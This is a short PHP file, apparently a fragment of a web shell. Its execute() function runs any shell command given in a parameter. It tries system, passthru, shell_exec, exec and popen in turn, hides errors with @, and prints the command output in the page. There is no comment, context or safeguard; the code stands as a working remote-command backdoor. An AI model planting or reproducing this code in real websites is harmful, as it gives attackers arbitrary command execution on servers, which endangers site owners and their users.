<?php
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} elseif(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} elseif(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024); 
			}
			@pclose($f);
		}
	}
	return $res;
}


if ($p1) 
	p('<pre>'.execute($p1).'</pre>');
?>